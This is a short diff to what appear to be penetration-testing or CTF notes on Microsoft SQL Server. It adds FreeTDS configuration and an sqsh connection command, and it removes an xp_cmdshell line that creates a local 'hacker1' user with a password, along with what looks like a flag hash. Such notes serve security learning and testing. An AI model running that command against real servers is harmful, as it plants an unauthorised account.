@@ -18,9 +18,19 @@ go
 ```
 
 
+### FreeTDS Config
 
-xp_cmdshell "net user hacker1 password /add"
-go
+> vim /etc/freetds/freetds.conf
 
+Add following:
 
-26b4cb0930a3e3be4da8e9d738607427
+```
+ [HOSTNAME]
+          host=10.10.10.10
+          port=9999
+          tds version = 7.0
+```
+
+Connect:
+
+> sqsh -S HOSTNAME
